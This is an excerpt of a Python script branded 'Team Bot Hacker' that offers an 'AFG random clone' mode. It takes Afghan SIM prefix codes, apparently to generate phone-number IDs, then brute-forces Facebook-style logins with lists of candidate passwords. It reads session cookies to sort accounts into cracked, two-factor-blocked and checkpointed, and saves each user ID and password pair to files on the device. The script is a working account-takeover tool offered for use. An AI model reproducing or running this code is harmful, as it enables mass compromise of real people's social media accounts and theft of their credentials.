#created by RD
#team name hbf
#tottaly written by RD 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; RD \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 𝐖 𝐀 𝐒 𝐈 𝐌 𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m   𝐖𝐀𝐒𝐈𝐌 𝟑𝟔𝟎         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    t.me/bothacker999    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31mv ➟   \033[1;32m    𝐖𝐀𝐒𝐈𝐌 𝟑𝟔𝟎    \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m    ➟   \033[1;32m1.2   \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32m𝙏𝙀𝘼𝙈 𝘽𝙊𝙏 𝙃𝘼𝘾𝙆𝙀𝙍\033[1;37m {\033[1;36mTBH\033[1;37m}   \033[1;31m          
\033[1;37m╚\033[1;36mⓉⒷⒽ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐓𝐄𝐀𝐌𓆪 𓆩𓆪  𓆩𝐁𝐎𝐓 𝐇𝐀𝐂𝐊𝐄𝐑𓆪 ]\x1b[0m══════\033[1;36mⓉⒷⒽ \033[1;37m 𝐖 𝐀 𝐒 𝐈 𝐌 
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {RDT()} {WHITE}]")
    print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
    print(f"{BLUE}══════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}AFG RANDOM CLONE ")
    print(f"{RED}[02] {WHITE}FEEDBACK 🙂 ")
    print(f"{RED}[03] {WHITE}SUBSCRIBE YOUTUB CHANNEL ")
    ...
    if RD in ["1","01"]:
        ...
        os.system("xdg-open https://www.youtube.com/@RD-360")
        XYZ()
    elif RD in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] AFG SIM CODES : {Y}0700, 0701, 0750, 0745')
    print(f' {GREEN}[!]               : {T}0703, 0802, 0701, 0705')
    print(f' {GREEN}[!]               : {Q}0749, 0716, 0714, 0735')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR AFG 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RD-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/RD-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio RD_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/RD-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio RD_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/RD-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio RD_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/RD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐖𝐀𝐒𝐈𝐌 🔥] [%s] \33[1;97m[OK:%s{RD2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
